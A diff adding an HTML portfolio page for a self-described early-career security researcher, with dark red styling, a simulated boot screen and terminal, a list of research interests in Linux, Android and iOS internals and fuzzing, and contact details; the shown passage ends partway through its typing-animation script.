@@ -1,0 +1,1214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Abood — Security Research</title>
+<meta name="description" content="Abood — Cybersecurity Researcher. Linux, Android & iOS internals, reverse engineering, fuzzing, vulnerability research.">
+
+<style>
+/* ==========================================================================
+ 0 . V*ARIABLES & RESET
+ ========================================================================== */
+:root{
+	--bg-0:#050505;
+	--bg-1:#0d0d0d;
+	--bg-2:#121212;
+	--red-bright:#ff2020;
+	--red-mid:#b30000;
+	--red-dark:#660000;
+	--white:#f5f5f5;
+	--gray:#a8a8a8;
+	--gray-dim:#707070;
+	--glass:rgba(255,255,255,0.03);
+	--glass-border:rgba(255,32,32,0.18);
+	--radius:16px;
+	--font-display:'Segoe UI', ui-sans-serif, system-ui, -apple-system, sans-serif;
+	--font-mono:'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+	--ease:cubic-bezier(.22,.9,.32,1);
+}
+
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+	background:var(--bg-0);
+	color:var(--white);
+	font-family:var(--font-display);
+	overflow-x:hidden;
+	line-height:1.6;
+	-webkit-font-smoothing:antialiased;
+}
+::selection{background:var(--red-mid);color:#fff;}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+img{max-width:100%;display:block;}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit;}
+
+@media (prefers-reduced-motion: reduce){
+	*{animation-duration:0.001ms !important;animation-iteration-count:1 !important;transition-duration:0.001ms !important;scroll-behavior:auto !important;}
+}
+
+/* ==========================================================================
+ 1 . B*ACKGROUND LAYERS (particles, orbs, scanlines, noise)
+ ========================================================================== */
+#particle-canvas{
+position:fixed;inset:0;z-index:0;pointer-events:none;
+}
+
+.orb{
+	position:fixed;border-radius:50%;
+	filter:blur(60px);
+	opacity:.35;
+	pointer-events:none;
+	z-index:0;
+	animation:float 18s ease-in-out infinite;
+}
+.orb-1{width:420px;height:420px;background:radial-gradient(circle,var(--red-mid),transparent 70%);top:-10%;left:-10%;animation-delay:0s;}
+.orb-2{width:340px;height:340px;background:radial-gradient(circle,var(--red-bright),transparent 70%);bottom:-5%;right:-5%;animation-delay:-6s;}
+.orb-3{width:260px;height:260px;background:radial-gradient(circle,var(--red-dark),transparent 70%);top:50%;left:60%;animation-delay:-12s;}
+
+@keyframes float{
+	0%,100%{transform:translate(0,0) scale(1);}
+	33%{transform:translate(40px,-30px) scale(1.08);}
+	66%{transform:translate(-30px,30px) scale(0.94);}
+}
+
+.scanlines{
+	position:fixed;inset:0;z-index:2;pointer-events:none;
+	background:repeating-linear-gradient(
+		to bottom,
+		rgba(255,255,255,0.0) 0px,
+										 rgba(255,255,255,0.0) 2px,
+										 rgba(0,0,0,0.06) 3px,
+										 rgba(0,0,0,0.06) 3px
+	);
+	mix-blend-mode:overlay;
+	opacity:.5;
+}
+
+.noise{
+	position:fixed;inset:0;z-index:3;pointer-events:none;
+	opacity:.035;
+	background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+	background-repeat:repeat;
+}
+
+.mouse-glow{
+	position:fixed;
+	width:400px;height:400px;
+	border-radius:50%;
+	background:radial-gradient(circle, rgba(255,32,32,0.10), transparent 70%);
+	pointer-events:none;
+	z-index:1;
+	transform:translate(-50%,-50%);
+	transition:opacity .3s ease;
+}
+
+/* ==========================================================================
+ 2 . B*OOT SCREEN
+ ========================================================================== */
+#boot-screen{
+position:fixed;inset:0;
+background:#000;
+z-index:9999;
+display:flex;
+align-items:center;
+justify-content:center;
+font-family:var(--font-mono);
+transition:opacity .8s var(--ease), visibility .8s var(--ease);
+}
+#boot-screen.hidden{opacity:0;visibility:hidden;pointer-events:none;}
+
+.boot-box{
+	width:min(640px, 90vw);
+	color:var(--red-bright);
+	font-size:clamp(12px,2.4vw,15px);
+}
+.boot-line{
+	opacity:0;
+	white-space:pre-wrap;
+	margin-bottom:8px;
+	animation:bootIn .4s forwards;
+	text-shadow:0 0 8px rgba(255,32,32,0.6);
+}
+.boot-line.ok{color:#7dff7d;text-shadow:0 0 8px rgba(125,255,125,0.5);}
+@keyframes bootIn{
+	from{opacity:0;transform:translateY(4px);}
+	to{opacity:1;transform:translateY(0);}
+}
+.boot-cursor{
+	display:inline-block;
+	width:8px;height:14px;
+	background:var(--red-bright);
+	animation:blink 1s step-end infinite;
+	vertical-align:middle;
+	margin-left:4px;
+}
+@keyframes blink{50%{opacity:0;}}
+
+/* ==========================================================================
+ 3 . S*CROLL PROGRESS BAR
+ ========================================================================== */
+#scroll-progress{
+position:fixed;top:0;left:0;
+height:3px;width:0%;
+background:linear-gradient(90deg,var(--red-dark),var(--red-bright));
+box-shadow:0 0 10px var(--red-bright);
+z-index:1000;
+transition:width .1s linear;
+}
+
+/* ==========================================================================
+ 4 . N*AVBAR
+ ========================================================================== */
+nav{
+	position:fixed;top:0;left:0;right:0;
+	z-index:900;
+	background:rgba(5,5,5,0.55);
+	backdrop-filter:blur(16px) saturate(140%);
+	-webkit-backdrop-filter:blur(16px) saturate(140%);
+	border-bottom:1px solid var(--glass-border);
+	transition:background .3s ease;
+}
+.nav-inner{
+	max-width:1200px;margin:0 auto;
+	display:flex;align-items:center;justify-content:space-between;
+	padding:16px clamp(16px,4vw,32px);
+}
+.logo{
+	font-weight:800;
+	letter-spacing:2px;
+	font-size:18px;
+	color:var(--white);
+	text-shadow:0 0 12px rgba(255,32,32,0.7);
+}
+.logo span{color:var(--red-bright);}
+
+.nav-links{
+	display:flex;gap:clamp(10px,2vw,28px);
+	font-size:14px;
+	font-weight:500;
+}
+.nav-links a{
+	position:relative;
+	color:var(--gray);
+	padding:6px 2px;
+	transition:color .25s ease;
+}
+.nav-links a::after{
+	content:'';
+	position:absolute;left:0;bottom:-4px;
+	width:0%;height:2px;
+	background:var(--red-bright);
+	box-shadow:0 0 8px var(--red-bright);
+	transition:width .3s var(--ease);
+}
+.nav-links a:hover{color:var(--white);}
+.nav-links a:hover::after{width:100%;}
+.nav-links a.active{color:var(--white);}
+.nav-links a.active::after{width:100%;}
+
+.nav-toggle{
+	display:none;
+	flex-direction:column;
+	gap:5px;
+	z-index:901;
+}
+.nav-toggle span{
+	width:24px;height:2px;background:var(--white);
+	transition:transform .3s ease, opacity .3s ease;
+}
+
+@media (max-width:820px){
+	.nav-links{
+		position:fixed;top:0;right:0;
+		height:100vh;width:min(280px,75vw);
+		background:rgba(8,8,8,0.97);
+		backdrop-filter:blur(20px);
+		flex-direction:column;
+		justify-content:center;
+		align-items:flex-start;
+		padding:40px;
+		gap:24px;
+		transform:translateX(100%);
+		transition:transform .4s var(--ease);
+		border-left:1px solid var(--glass-border);
+	}
+	.nav-links.open{transform:translateX(0);}
+	.nav-toggle{display:flex;}
+	.nav-toggle.open span:nth-child(1){transform:translateY(7px) rotate(45deg);}
+	.nav-toggle.open span:nth-child(2){opacity:0;}
+	.nav-toggle.open span:nth-child(3){transform:translateY(-7px) rotate(-45deg);}
+}
+
+/* ==========================================================================
+ 5 . G*ENERIC LAYOUT / SECTION HELPERS
+ ========================================================================== */
+section{
+	position:relative;
+	z-index:5;
+	padding:clamp(70px,10vw,120px) clamp(16px,5vw,32px);
+	max-width:1200px;
+	margin:0 auto;
+}
+.eyebrow{
+	display:inline-block;
+	font-family:var(--font-mono);
+	font-size:12px;
+	letter-spacing:3px;
+	text-transform:uppercase;
+	color:var(--red-bright);
+	border:1px solid var(--glass-border);
+	padding:5px 12px;
+	border-radius:20px;
+	background:rgba(255,32,32,0.06);
+	margin-bottom:18px;
+}
+.section-title{
+	font-size:clamp(28px,4.5vw,44px);
+	font-weight:800;
+	margin-bottom:14px;
+	letter-spacing:-0.5px;
+}
+.section-sub{
+	color:var(--gray);
+	max-width:620px;
+	margin-bottom:48px;
+	font-size:clamp(14px,1.6vw,17px);
+}
+
+.reveal{
+	opacity:0;
+	transform:translateY(30px);
+	transition:opacity .8s var(--ease), transform .8s var(--ease);
+}
+.reveal.visible{opacity:1;transform:translateY(0);}
+
+.glass-card{
+	background:var(--glass);
+	border:1px solid var(--glass-border);
+	border-radius:var(--radius);
+	backdrop-filter:blur(14px);
+	-webkit-backdrop-filter:blur(14px);
+	transition:transform .35s var(--ease), border-color .35s ease, box-shadow .35s ease;
+}
+.glass-card:hover{
+	transform:translateY(-6px);
+	border-color:rgba(255,32,32,0.5);
+	box-shadow:0 20px 50px -20px rgba(255,32,32,0.35);
+}
+
+.btn{
+	display:inline-flex;align-items:center;gap:8px;
+	padding:13px 26px;
+	border-radius:10px;
+	font-weight:600;
+	font-size:14px;
+	letter-spacing:.3px;
+	transition:transform .25s var(--ease), box-shadow .25s ease, background .25s ease;
+}
+.btn-primary{
+	background:linear-gradient(135deg,var(--red-mid),var(--red-bright));
+	color:#fff;
+	box-shadow:0 0 20px rgba(255,32,32,0.35);
+}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 8px 30px rgba(255,32,32,0.55);}
+.btn-ghost{
+	border:1px solid var(--glass-border);
+	color:var(--white);
+	background:rgba(255,255,255,0.02);
+}
+.btn-ghost:hover{border-color:var(--red-bright);background:rgba(255,32,32,0.08);transform:translateY(-3px);}
+
+/* ==========================================================================
+ 6 . H*ERO
+ ========================================================================== */
+#home{
+min-height:100vh;
+display:flex;flex-direction:column;
+align-items:flex-start;justify-content:center;
+padding-top:140px;
+}
+.hero-title{
+	font-size:clamp(56px,13vw,150px);
+	font-weight:900;
+	letter-spacing:-2px;
+	line-height:.95;
+	color:var(--white);
+	text-shadow:0 0 30px rgba(255,32,32,0.55), 0 0 80px rgba(255,32,32,0.25);
+	position:relative;
+}
+.glitch{
+	position:relative;
+	display:inline-block;
+}
+.glitch::before,.glitch::after{
+	content:attr(data-text);
+	position:absolute;left:0;top:0;
+	width:100%;
+	overflow:hidden;
+	clip-path:inset(0 0 0 0);
+}
+.glitch::before{
+	color:var(--red-bright);
+	animation:glitchTop 4.5s infinite linear;
+	z-index:-1;
+}
+.glitch::after{
+	color:#00e5ff;
+	opacity:.6;
+	animation:glitchBot 5.5s infinite linear;
+	z-index:-2;
+}
+@keyframes glitchTop{
+	0%,92%,100%{clip-path:inset(0 0 90% 0);transform:translate(0);}
+	93%{clip-path:inset(10% 0 60% 0);transform:translate(-3px,-2px);}
+	95%{clip-path:inset(40% 0 20% 0);transform:translate(3px,2px);}
+	97%{clip-path:inset(70% 0 5% 0);transform:translate(-2px,1px);}
+}
+@keyframes glitchBot{
+	0%,90%,100%{clip-path:inset(90% 0 0 0);transform:translate(0);}
+	91%{clip-path:inset(20% 0 65% 0);transform:translate(3px,1px);}
+	94%{clip-path:inset(55% 0 10% 0);transform:translate(-3px,-1px);}
+	98%{clip-path:inset(5% 0 80% 0);transform:translate(2px,-2px);}
+}
+
+.hero-subtitle{
+	font-size:clamp(18px,2.6vw,26px);
+	color:var(--red-bright);
+	font-weight:600;
+	margin-top:18px;
+	font-family:var(--font-mono);
+}
+.typing-line{
+	font-family:var(--font-mono);
+	font-size:clamp(15px,2vw,19px);
+	color:var(--gray);
+	margin-top:10px;
+	min-height:28px;
+}
+.typing-line .cursor{
+	display:inline-block;width:9px;height:18px;
+	background:var(--red-bright);
+	margin-left:3px;vertical-align:middle;
+	animation:blink 0.9s step-end infinite;
+}
+
+.hero-intro{
+	max-width:640px;
+	color:var(--gray);
+	margin-top:28px;
+	font-size:clamp(14px,1.6vw,16px);
+}
+
+.hero-btns{
+	display:flex;gap:16px;margin-top:36px;flex-wrap:wrap;
+}
+
+.scroll-cue{
+	position:absolute;bottom:30px;left:50%;transform:translateX(-50%);
+	font-family:var(--font-mono);
+	font-size:11px;letter-spacing:2px;
+	color:var(--gray-dim);
+	display:flex;flex-direction:column;align-items:center;gap:8px;
+	animation:bob 2.4s ease-in-out infinite;
+}
+.scroll-cue .line{width:1px;height:30px;background:linear-gradient(var(--red-bright),transparent);}
+@keyframes bob{0%,100%{transform:translate(-50%,0);}50%{transform:translate(-50%,8px);}}
+
+/* ==========================================================================
+ 7 . T*ERMINAL
+ ========================================================================== */
+.terminal{
+	border-radius:14px;
+	overflow:hidden;
+	border:1px solid var(--glass-border);
+	box-shadow:0 30px 80px -30px rgba(255,32,32,0.3);
+	background:rgba(10,10,10,0.85);
+	backdrop-filter:blur(10px);
+}
+.terminal-bar{
+	display:flex;align-items:center;gap:8px;
+	padding:12px 16px;
+	background:rgba(255,255,255,0.03);
+	border-bottom:1px solid var(--glass-border);
+}
+.dot{width:11px;height:11px;border-radius:50%;}
+.dot.red{background:#ff5f56;}
+.dot.yellow{background:#ffbd2e;}
+.dot.green{background:#27c93f;}
+.terminal-title{
+	margin-left:10px;font-family:var(--font-mono);font-size:12px;color:var(--gray-dim);
+}
+.terminal-body{
+	padding:24px;
+	font-family:var(--font-mono);
+	font-size:clamp(12.5px,1.6vw,15px);
+	min-height:260px;
+	color:#d6d6d6;
+	white-space:pre-wrap;
+}
+.terminal-body .prompt{color:var(--red-bright);}
+.terminal-cursor{
+	display:inline-block;width:8px;height:16px;background:var(--red-bright);
+	vertical-align:middle;margin-left:2px;
+	animation:blink 1s step-end infinite;
+}
+
+/* ==========================================================================
+ 8 . G*RIDS: goals / research / projects
+ ========================================================================== */
+.grid{
+	display:grid;
+	gap:22px;
+	grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+}
+
+.card{
+	padding:28px;
+}
+.card-icon{
+	width:46px;height:46px;
+	display:flex;align-items:center;justify-content:center;
+	border-radius:12px;
+	background:linear-gradient(135deg,rgba(255,32,32,0.18),rgba(102,0,0,0.18));
+	border:1px solid var(--glass-border);
+	margin-bottom:18px;
+	font-size:20px;
+}
+.card h3{
+	font-size:18px;font-weight:700;margin-bottom:8px;
+}
+.card p{
+	color:var(--gray);font-size:14px;
+}
+
+.research-card h3{
+	font-size:16px;
+	color:var(--red-bright);
+	font-family:var(--font-mono);
+	letter-spacing:1px;
+	margin-bottom:14px;
+	text-transform:uppercase;
+}
+.research-card ul li{
+	color:var(--gray);
+	font-size:14.5px;
+	padding:6px 0;
+	border-bottom:1px dashed rgba(255,255,255,0.06);
+}
+.research-card ul li:last-child{border-bottom:none;}
+.research-card ul li::before{
+	content:'▸ ';color:var(--red-bright);
+}
+
+.project-card{
+	display:flex;flex-direction:column;justify-content:space-between;
+	padding:28px;
+}
+.project-card h3{font-size:19px;margin-bottom:10px;}
+.project-card p{color:var(--gray);font-size:14px;margin-bottom:20px;}
+.project-tags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px;}
+.tag{
+	font-family:var(--font-mono);
+	font-size:11px;
+	padding:4px 10px;
+	border-radius:20px;
+	border:1px solid var(--glass-border);
+	color:var(--gray);
+}
+
+/* ==========================================================================
+ 9 . P*HILOSOPHY QUOTE
+ ========================================================================== */
+#philosophy{
+text-align:center;
+padding-top:90px;padding-bottom:90px;
+}
+.quote-mark{
+	font-size:80px;
+	color:var(--red-mid);
+	line-height:.5;
+	opacity:.6;
+}
+blockquote{
+	font-size:clamp(22px,4vw,38px);
+	font-weight:700;
+	max-width:820px;
+	margin:20px auto 0;
+	line-height:1.4;
+	color:var(--white);
+	text-shadow:0 0 30px rgba(255,32,32,0.25);
+}
+
+/* ==========================================================================
+ 1 0. *GITHUB / CONTACT
+ ========================================================================== */
+.github-card{
+	padding:44px;
+	display:flex;
+	flex-wrap:wrap;
+	gap:28px;
+	align-items:center;
+	justify-content:space-between;
+}
+.github-left{display:flex;align-items:center;gap:18px;}
+.github-avatar{
+	width:60px;height:60px;border-radius:50%;
+	background:linear-gradient(135deg,var(--red-dark),var(--red-bright));
+	display:flex;align-items:center;justify-content:center;
+	font-weight:800;font-size:22px;
+	box-shadow:0 0 25px rgba(255,32,32,0.4);
+}
+.github-handle{font-family:var(--font-mono);color:var(--gray);font-size:14px;}
+
+.contact-grid{
+	display:grid;
+	grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
+	gap:20px;
+}
+.contact-card{
+	padding:26px;
+	display:flex;align-items:center;gap:16px;
+}
+.contact-icon{
+	width:42px;height:42px;border-radius:10px;
+	display:flex;align-items:center;justify-content:center;
+	background:rgba(255,32,32,0.1);
+	border:1px solid var(--glass-border);
+}
+.contact-label{font-size:12px;color:var(--gray-dim);text-transform:uppercase;letter-spacing:1px;}
+.contact-value{font-size:15px;font-weight:600;}
+
+/* ==========================================================================
+ 1 1. *FOOTER
+ ========================================================================== */
+footer{
+	position:relative;z-index:5;
+	text-align:center;
+	padding:40px 16px 30px;
+	border-top:1px solid var(--glass-border);
+	color:var(--gray-dim);
+	font-size:13px;
+}
+footer .built{color:var(--gray);margin-bottom:6px;}
+footer .tags{font-family:var(--font-mono);font-size:12px;letter-spacing:1px;color:var(--red-mid);}
+
+/* ==========================================================================
+ 1 2. *RESPONSIVE TWEAKS
+ ========================================================================== */
+@media (max-width:600px){
+	.hero-btns{flex-direction:column;align-items:stretch;}
+	.github-card{flex-direction:column;align-items:flex-start;}
+}
+</style>
+</head>
+<body>
+
+<!-- ========================================================================
+BOOT SCREEN
+======================================================================== -->
+<div id="boot-screen">
+<div class="boot-box" id="boot-lines"></div>
+</div>
+
+<!-- background layers -->
+<canvas id="particle-canvas"></canvas>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+<div class="orb orb-3"></div>
+<div class="scanlines"></div>
+<div class="noise"></div>
+<div class="mouse-glow" id="mouseGlow"></div>
+
+<div id="scroll-progress"></div>
+
+<!-- ========================================================================
+NAVBAR
+======================================================================== -->
+<nav>
+<div class="nav-inner">
+<a href="#home" class="logo">ABOOD<span>_</span></a>
+<button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
+<span></span><span></span><span></span>
+</button>
+<ul class="nav-links" id="navLinks">
+<li><a href="#home" class="nav-link" data-section="home">Home</a></li>
+<li><a href="#about" class="nav-link" data-section="about">About</a></li>
+<li><a href="#goals" class="nav-link" data-section="goals">Goals</a></li>
+<li><a href="#research" class="nav-link" data-section="research">Research</a></li>
+<li><a href="#projects" class="nav-link" data-section="projects">Projects</a></li>
+<li><a href="#philosophy" class="nav-link" data-section="philosophy">Philosophy</a></li>
+<li><a href="#github" class="nav-link" data-section="github">GitHub</a></li>
+<li><a href="#contact" class="nav-link" data-section="contact">Contact</a></li>
+</ul>
+</div>
+</nav>
+
+<!-- ========================================================================
+HERO
+======================================================================== -->
+<section id="home">
+<span class="eyebrow reveal">// SECURITY RESEARCH PORTFOLIO</span>
+<h1 class="hero-title">
+<span class="glitch" data-text="ABOOD">ABOOD</span>
+</h1>
+<div class="hero-subtitle">Cybersecurity Researcher</div>
+<div class="typing-line">&gt; <span id="typingText"></span><span class="cursor"></span></div>
+
+<p class="hero-intro reveal">
+I'm a cybersecurity researcher who wants to understand systems from the inside out — not just how to
+use them, but how they're built, why they break, and what assumptions quietly hold them together.
+My focus spans Linux internals, Android internals, iOS security, reverse engineering, fuzzing,
+vulnerability research, and cryptography. I'm not chasing a title; I'm building the depth of
+understanding that real security research requires, one layer at a time. Discovering my first
+real-world 0-day on iOS or Android isn't a claim I'm making today — it's the goal I'm training toward.
+</p>
+
+<div class="hero-btns reveal">
+<a href="https://github.com/aboood971" target="_blank" rel="noopener" class="btn btn-primary">
+<span>GitHub</span>
+</a>
+<a href="#about" class="btn btn-ghost">
+<span>Learn More</span>
+</a>
+</div>
+
+<div class="scroll-cue"><div class="line"></div>SCROLL</div>
+</section>
+
+<!-- ========================================================================
+TERMINAL SECTION
+======================================================================== -->
+<section id="terminal-section">
+<span class="eyebrow reveal">// LIVE SESSION</span>
+<h2 class="section-title reveal">A quick look at the shell</h2>
+<p class="section-sub reveal">A snapshot of who I am, rendered the way I think best — as a terminal session.</p>
+
+<div class="terminal reveal">
+<div class="terminal-bar">
+<div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+<span class="terminal-title">abood@parrot: ~</span>
+</div>
+<div class="terminal-body" id="terminalBody"></div>
+</div>
+</section>
+
+<!-- ========================================================================
+ABOUT
+======================================================================== -->
+<section id="about">
+<span class="eyebrow reveal">// ABOUT</span>
+<h2 class="section-title reveal">Learning systems by taking them apart</h2>
+<div class="glass-card reveal" style="padding:36px;max-width:820px;">
+<p style="color:var(--gray);font-size:16px;">
+I'm a cybersecurity Researcher with a deep interest in operating systems and how they actually work
+underneath the interfaces we take for granted. I spend my time as a Linux enthusiast, exploring the
+kernel, the filesystem, and the way processes and permissions interact. From there, my curiosity
+naturally extends into Android and iOS — two very different operating systems built on very different
+security models, both worth understanding in depth.
+</p>
+<br>
+<p style="color:var(--gray);font-size:16px;">
+I'm particularly drawn to vulnerability research: the discipline of asking "what happens if this
+assumption is wrong?" and following that question with patience, tools, and method. I'm still early
+in that journey, learning reverse engineering, basic fuzzing workflows, and the fundamentals that
+real researchers build on. I care about depth over speed — understanding a system properly matters
+more to me than moving fast and skipping the internals.
+</p>
+</div>
+</section>
+
+<!-- ========================================================================
+GOALS
+======================================================================== -->
+<section id="goals">
+<span class="eyebrow reveal">// ROADMAP</span>
+<h2 class="section-title reveal">Where I'm headed</h2>
+<p class="section-sub reveal">The skills and milestones I'm actively building toward.</p>
+
+<div class="grid" id="goalsGrid"></div>
+</section>
+
+<!-- ========================================================================
+RESEARCH
+======================================================================== -->
+<section id="research">
+<span class="eyebrow reveal">// AREAS OF STUDY</span>
+<h2 class="section-title reveal">Research focus areas</h2>
+<p class="section-sub reveal">The technical domains I'm currently studying, organized by platform and discipline.</p>
+
+<div class="grid" id="researchGrid"></div>
+</section>
+
+<!-- ========================================================================
+PROJECTS
+======================================================================== -->
+<section id="projects">
+<span class="eyebrow reveal">// WORK IN PROGRESS</span>
+<h2 class="section-title reveal">Projects &amp; notes</h2>
+<p class="section-sub reveal">Ongoing work, documented as it happens — expect this section to grow.</p>
+
+<div class="grid" id="projectsGrid"></div>
+</section>
+
+<!-- ========================================================================
+PHILOSOPHY
+======================================================================== -->
+<section id="philosophy">
+<div class="quote-mark reveal">&ldquo;</div>
+<blockquote class="reveal">
+Every complex system is built on assumptions. Understanding those assumptions is the first step
+toward discovering vulnerabilities.
+</blockquote>
+</section>
+
+<!-- ========================================================================
+GITHUB
+======================================================================== -->
+<section id="github">
+<span class="eyebrow reveal">// OPEN SOURCE</span>
+<h2 class="section-title reveal">Follow the work</h2>
+
+<div class="glass-card github-card reveal">
+<div class="github-left">
+<div class="github-avatar">A</div>
+<div>
+<div style="font-weight:700;font-size:18px;">aboood971</div>
+<div class="github-handle">github.com/aboood971</div>
+</div>
+</div>
+<a href="https://github.com/aboood971" target="_blank" rel="noopener" class="btn btn-primary">Visit GitHub</a>
+</div>
+</section>
+
+<!-- ========================================================================
+CONTACT
+======================================================================== -->
+<section id="contact">
+<span class="eyebrow reveal">// GET IN TOUCH</span>
+<h2 class="section-title reveal">Contact</h2>
+
+<div class="contact-grid">
+<div class="glass-card contact-card reveal">
+<div class="contact-icon">🐙</div>
+<div>
+<div class="contact-label">GitHub</div>
+<div class="contact-value">github.com/aboood971</div>
+</div>
+</div>
+<div class="glass-card contact-card reveal">
+<div class="contact-icon">✉️</div>
+<div>
+<div class="contact-label">Email</div>
+<div class="contact-value">abood971@proton.me</div>
+</div>
+</div>
+</div>
+</section>
+
+<footer>
+<div class="built">Built with HTML, CSS &amp; JavaScript</div>
+<div class="tags">Linux • Security Research • Reverse Engineering</div>
+<div style="margin-top:10px;font-size:12px;">&copy; <span id="year"></span> Abood</div>
+</footer>
+
+<script>
+/* ============================================================================
+ A BOO*D PORTFOLIO — JAVASCRIPT
+ Organized sections:
+ 1. Boot sequence
+ 2. Data (goals / research / projects) + render
+ 3. Typing animation (hero)
+ 4. Terminal typing effect
+ 5. Particle engine + mouse glow
+ 6. Scroll progress + navbar active state + scroll reveal
+ 7. Mobile nav toggle
+ 8. Footer year
+ ============================================================================ */
+
+document.addEventListener('DOMContentLoaded', () => {
+	
+	/* ==========================================================================
+	 1 .* BOOT SEQUENCE
+	 ========================================================================== */
+	function runBootSequence(){
+		const lines = [
+			{ text: 'Initializing kernel...', ok:false },
+			{ text: '[  OK  ] Kernel initialized', ok:true },
+			{ text: 'Loading security modules...', ok:false },
+			{ text: '[  OK  ] Security modules loaded', ok:true },
+			{ text: 'Mounting filesystem...', ok:false },
+			{ text: '[  OK  ] Filesystem mounted', ok:true },
+			{ text: 'Starting research environment...', ok:false },
+			{ text: '[  OK  ] Research environment online', ok:true },
+			{ text: 'Loading vulnerability database...', ok:false },
+			{ text: '[  OK  ] Vulnerability database loaded', ok:true },
+			{ text: 'System ready.', ok:true },
+		];
+		
+		const container = document.getElementById('boot-lines');
+		let delay = 120;
+		const stepDelay = 260;
+		
+		lines.forEach((line, i) => {
+			setTimeout(() => {
+				const div = document.createElement('div');
+				div.className = 'boot-line' + (line.ok ? ' ok' : '');
+				div.textContent = line.text;
+				if(i === lines.length - 1){
+					const cursor = document.createElement('span');
+					cursor.className = 'boot-cursor';
+					div.appendChild(cursor);
+				}
+				container.appendChild(div);
+			}, delay + i * stepDelay);
+		});
+		
+		const totalTime = delay + lines.length * stepDelay + 500;
+		setTimeout(() => {
+			const bootScreen = document.getElementById('boot-screen');
+			bootScreen.classList.add('hidden');
+			document.body.style.overflow = 'auto';
+		}, totalTime);
+	}
+	
+	document.body.style.overflow = 'hidden';
+	runBootSequence();
+	setTimeout(() => { document.body.style.overflow = 'auto'; }, 3400);
+	
+	/* ==========================================================================
+	 2 .* DATA + RENDER (goals / research / projects)
+========================================================================== */
+	const goals = [
+		{ icon:'🐧', title:'Linux Internals', desc:'Deepening my understanding of the kernel, processes, and the filesystem layer.' },
+		{ icon:'🤖', title:'Android Internals', desc:'Studying AOSP, the Binder IPC mechanism, and the ART runtime.' },
+		{ icon:'🍎', title:'iOS Security Research', desc:"Exploring XNU, the sandbox model, and Apple's security architecture." },
+		{ icon:'🛡️', title:'Kernel Security', desc:'Learning how kernel-level protections work, and where they historically fail.' },
+		{ icon:'🔍', title:'Reverse Engineering', desc:'Practicing static and dynamic analysis with real-world tooling.' },
+		{ icon:'⚙️', title:'Fuzzing', desc:'Building intuition for coverage-guided fuzzing and crash triage.' },
+		{ icon:'🧱', title:'Exploit Mitigations', desc:'Understanding ASLR, stack canaries, CFI, and how researchers work around them.' },
+		{ icon:'📝', title:'Security Research Publications', desc:'A future goal: writing up findings clearly enough for others to learn from.' },
+		{ icon:'🧩', title:'Open Source Security Tools', desc:'Contributing tooling back to the community as my skills mature.' },
+	];
+	
+	const research = [
+		{ title:'Linux', items:['Kernel','ELF','Memory Management','System Calls'] },
+		{ title:'Android', items:['AOSP','Binder','ART','SELinux','Native Code'] },
+		{ title:'iOS', items:['XNU','Mach','Sandbox','Objective-C','Swift'] },
+		{ title:'Reverse Engineering', items:['Ghidra','JADX','Frida','LLDB'] },
+		{ title:'Fuzzing', items:['AFL++','libFuzzer','Syzkaller','Crash Analysis'] },
+		{ title:'Cryptography', items:['Bitcoin','Wallet Security','Privacy','Self Custody'] },
+	];
+	
+	const projects = [
+		{ title:'Security Research Notes', desc:'Ongoing written notes as I work through courses, CTFs, and internals research.', tags:['Notes','Learning'] },
+		{ title:'Reverse Engineering Experiments', desc:'Small binaries and exercises analyzed with Ghidra, JADX, and Frida.', tags:['Ghidra','Frida'] },
+		{ title:'Linux Projects', desc:'Scripts and small tools built while exploring Linux internals hands-on.', tags:['Linux','Bash'] },
+		{ title:'Security Tools', desc:'Early-stage open-source tooling — built to learn, shared for others to use.', tags:['Open Source'] },
+	];
+	
+	function renderGoals(){
+		const grid = document.getElementById('goalsGrid');
+		grid.innerHTML = goals.map(g => `
+		<div class="glass-card card reveal">
+		<div class="card-icon">${g.icon}</div>
+		<h3>${g.title}</h3>
+		<p>${g.desc}</p>
+		</div>
+		`).join('');
+	}
+	
+	function renderResearch(){
+		const grid = document.getElementById('researchGrid');
+		grid.innerHTML = research.map(r => `
+		<div class="glass-card card research-card reveal">
+		<h3>${r.title}</h3>
+		<ul>${r.items.map(i => `<li>${i}</li>`).join('')}</ul>
+		</div>
+		`).join('');
+	}
+	
+	function renderProjects(){
+		const grid = document.getElementById('projectsGrid');
+		grid.innerHTML = projects.map(p => `
+		<div class="glass-card project-card reveal">
+		<div>
+		<h3>${p.title}</h3>
+		<p>${p.desc}</p>
+		<div class="project-tags">${p.tags.map(t => `<span class="tag">${t}</span>`).join('')}</div>
+		</div>
+		<a href="https://github.com/aboood971" target="_blank" rel="noopener" class="btn btn-ghost">GitHub →</a>
+		</div>
+		`).join('');
+	}
+	
+	renderGoals();
+	renderResearch();
+	renderProjects();
+	
+	/* ==========================================================================
+	 3 .* TYPING ANIMATION (hero)
+========================================================================== */
+	const phrases = [
+		'Linux Enthusiast',
+		'Android Security Research',
+		'iOS Security Research',
+		'Reverse Engineering',
+		'Vulnerability Research',
+		'Future iOS & Android 0-Day Researcher',
+		'Crypto Enthusiast',
+	];
+	
+	function typeLoop(el){
+		let phraseIndex = 0;
+		let charIndex = 0;
+		let deleting = false;
+		
+		function tick(){
+			const current = phrases[phraseIndex];
+			if(!deleting){
+				charIndex++;
+				el.textContent = current.slice(0, charIndex);
+				if(charIndex === current.length){
+					deleting = true;
+					setTimeout(tick, 1400);
+					return;
+				}
+			} else {
+				charIndex--;
+				el.textContent = current.slice(0, charIndex);
+				if(charIndex === 0){
+					deleting = false;
+					phraseIndex = (phraseIndex + 1) % phrases.length;
+				}
